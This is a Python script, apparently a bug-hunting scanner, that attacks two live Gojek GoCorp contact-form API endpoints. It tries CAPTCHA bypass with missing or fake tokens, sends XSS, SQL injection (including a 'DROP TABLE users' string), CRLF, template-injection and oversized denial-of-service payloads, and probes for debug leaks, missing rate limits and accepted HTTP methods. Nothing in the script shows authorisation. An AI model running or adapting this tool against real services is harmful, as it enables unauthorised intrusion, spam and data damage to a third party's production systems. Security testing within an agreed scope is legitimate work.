"""Gojek GoCorp vulnerability verification - CAPTCHA bypass, injection, fuzzing."""
import requests, json, re, os

H = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/html, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Origin': 'https://www.gojek.com',
    'Referer': 'https://www.gojek.com/en-id/gocorp/',
}

os.makedirs('D:/scan/_new_targets/gojek', exist_ok=True)

ENDPOINTS = [
    'https://www.gojek.com/api/gocorp-id/submit-contact-form',
    'https://www.gojek.com/api/v2/gocorp-id-zeus',
]

def test(label, url, method='POST', body=None, headers_extra=None):
    """Return (status, body_text, content_type)"""
    h = {**H}
    if headers_extra:
        h.update(headers_extra)
    try:
        if method == 'POST':
            if isinstance(body, dict):
                r = requests.post(url, headers={**h, 'Content-Type': 'application/json'}, json=body, timeout=10)
            else:
                r = requests.post(url, headers={**h, 'Content-Type': 'application/x-www-form-urlencoded'}, data=body, timeout=10)
        else:
            r = requests.get(url, headers=h, timeout=10)
        return (r.status_code, r.text[:500], r.headers.get('content-type', ''))
    except Exception as e:
        return (0, str(e)[:200], '')

for url in ENDPOINTS:
    endpoint_name = url.split('/')[-1]
    print(f"\n{'='*70}")
    print(f"=== {endpoint_name} ===")
    print(f"=== {url} ===")

    # ===== 1. CAPTCHA BYPASS: No CAPTCHA fields =====
    print(f"\n--- [1] CAPTCHA BYPASS: Submit without CAPTCHA ---")
    payloads = [
        {'name': 'test', 'email': 'test@test.com', 'company': 'test', 'phone': '1234567890'},
        {'name': 'test', 'email': 'test@test.com', 'company': 'test'},
        {'full_name': 'test', 'email': 'test@test.com', 'company_name': 'test', 'phone_number': '1234567890'},
        {'first_name': 'test', 'last_name': 'test', 'email': 'test@test.com', 'business_name': 'test'},
        # Minimal - just the bare minimum
        {'email': 'test@test.com'},
        {'name': 'test'},
        {},
    ]
    for body in payloads:
        s, txt, ct = test(f"no_captcha_{list(body.keys())}", url, body=body)
        indicator = ""
        if 'success' in txt.lower():
            try:
                j = json.loads(txt)
                msg = j.get('message', '')
                success = j.get('success', None)
                indicator = f" | success={success} | msg={msg[:80]}"
            except:
                indicator = f" | {txt[:80]}"
        elif s != 400:
            indicator = f" | STATUS={s} | {txt[:80]}"
        else:
            indicator = f" | {txt[:80]}"
        print(f"  fields={list(body.keys())} -> {s}{indicator}")

    # ===== 2. CAPTCHA BYPASS: Empty/fake CAPTCHA values =====
    print(f"\n--- [2] CAPTCHA BYPASS: Fake/empty CAPTCHA ---")
    base_form = {'name': 'test', 'email': 'test@test.com', 'company': 'test', 'phone': '1234567890'}
    
    captcha_combos = [
        {},  # no captcha at all
        {'ticket': '', 'randstr': ''},
        {'ticket': 'test', 'randstr': 'test'},
        {'ticket': '1234567890', 'randstr': '1234567890'},
        {'captcha': 'test'},
        {'g-recaptcha-response': 'test'},
        {'captcha_token': 'test'},
        {'recaptcha_response': 'test'},
        # Common Gojek CAPTCHA patterns
        {'ticket': 'null', 'randstr': 'null'},
        {'ticket': None, 'randstr': None},
        # Bypass with longer strings
        {'ticket': 'a'*100, 'randstr': 'a'*100},
        {'ticket': 'a'*1000, 'randstr': 'a'*1000},
        # Try numeric
        {'ticket': 12345, 'randstr': 'abc'},
        {'ticket': 0, 'randstr': ''},
    ]
    
    for captcha in captcha_combos:
        body = {**base_form, **captcha}
        s, txt, ct = test(f"captcha_{captcha}", url, body=body)
        try:
            j = json.loads(txt)
            msg = j.get('message', '')[:100]
            success = j.get('success', None)
            if success is True:
                print(f"  🚨 POSSIBLE BYPASS! captcha={captcha} -> success=True | {msg}")
            elif 'captcha' in msg.lower() or 'ticket' in msg.lower():
                pass  # expected
            else:
                print(f"  ❓ captcha={captcha} -> {s} | {msg}")
        except:
            if s == 200:
                print(f"  🚨 captcha={captcha} -> 200! Body: {txt[:100]}")

    # ===== 3. INJECTION: XSS/SQLi/CRLF =====
    print(f"\n--- [3] INJECTION TESTS ---")
    inject_payloads = [
        # XSS
        {'name': '<script>alert(1)</script>', 'email': 'xss@test.com'},
        {'name': '<img src=x onerror=alert(1)>', 'email': 'xss@test.com'},
        {'name': '"><script>alert(1)</script>', 'email': 'xss@test.com'},
        # SQLi
        {'name': "test' OR '1'='1", 'email': 'sqli@test.com'},
        {'name': "test'; DROP TABLE users;--", 'email': 'sqli@test.com'},
        # CRLF injection
        {'name': 'test\r\nInjected-Header: value', 'email': 'crlf@test.com'},
        # Long strings (DoS)
        {'name': 'A'*10000, 'email': 'dos@test.com'},
        # SSTI
        {'name': '{{7*7}}', 'email': 'ssti@test.com'},
        {'name': '${7*7}', 'email': 'ssti@test.com'},
    ]
    
    for payload in inject_payloads:
        s, txt, ct = test(f"inject_{list(payload.keys())}", url, body=payload)
        try:
            j = json.loads(txt)
            msg = j.get('message', '')[:120]
            # Check if XSS reflected
            if '<script>' in msg.lower() or '<img' in msg.lower() or 'alert' in msg.lower():
                print(f"  🚨 XSS REFLECTED! payload={payload['name'][:40]} | msg={msg}")
            elif '49' in msg and '7*7' in str(payload.values()):
                print(f"  🚨 SSTI! payload={payload['name'][:40]} | msg={msg}")
            elif s >= 500:
                print(f"  ⚠️ 500 ERROR! payload={payload['name'][:40]} | {msg}")
            elif 'captcha' not in msg.lower():
                print(f"  ❓ payload={payload['name'][:40]} -> {s} | {msg}")
        except:
            if s == 200:
                print(f"  ❓ payload={payload['name'][:40]} -> 200! Body: {txt[:100]}")

    # ===== 4. FORM DATA variant (bypass JSON validation) =====
    print(f"\n--- [4] FORM DATA (non-JSON) ---")
    form_bodies = [
        'name=test&email=test@test.com&company=test',
        'name=test&email=test@test.com&company=test&ticket=&randstr=',
        'name=test&email=test@test.com',
    ]
    for body in form_bodies:
        s, txt, ct = test(f"form_{body[:30]}", url, body=body)
        print(f"  body={body[:50]} -> {s} | {txt[:120]}")

    # ===== 5. Look for debug/info leak =====
    print(f"\n--- [5] ERROR/DEBUG LEAK ---")
    debug_payloads = [
        {'name': 'admin', 'email': 'admin@gojek.com'},
        {'name': 'test', 'email': 'test@test.com', 'debug': True},
        {'name': 'test', 'email': 'test@test.com', 'test_mode': True},
        {'name': 'test', 'email': 'invalid', 'phone': 'notanumber'},
    ]
    for body in debug_payloads:
        s, txt, ct = test(f"debug_{list(body.keys())}", url, body=body)
        try:
            j = json.loads(txt)
            msg = j.get('message', '')[:120]
            data = j.get('data', {})
            if data and len(str(data)) > 10:
                print(f"  ❓ body={list(body.keys())} -> data returned: {str(data)[:120]}")
            elif 'captcha' not in msg.lower():
                print(f"  ❓ body={list(body.keys())} -> {msg}")
        except:
            pass

    # ===== 6. Rate limiting test (quick) =====
    print(f"\n--- [6] RATE LIMIT QUICK TEST (5 requests) ---")
    for i in range(5):
        s, txt, ct = test(f"rate_{i}", url, body={'email': f'test{i}@test.com'})
        if s == 429:
            print(f"  ⚠️ RATE LIMITED at request {i+1}")
            break
    else:
        print(f"  No rate limit detected in 5 quick requests (may need more)")

    # ===== 7. HTTP method fuzz =====
    print(f"\n--- [7] HTTP METHOD FUZZ ---")
    for method in ['GET', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']:
        s, txt, ct = test(f"method_{method}", url, method=method)
        if s != 405 and s != 404:
            print(f"  {method:7s} -> {s} | {txt[:100]}")

print(f"\n\n{'='*70}")
print("=== ANALYSIS COMPLETE ===")
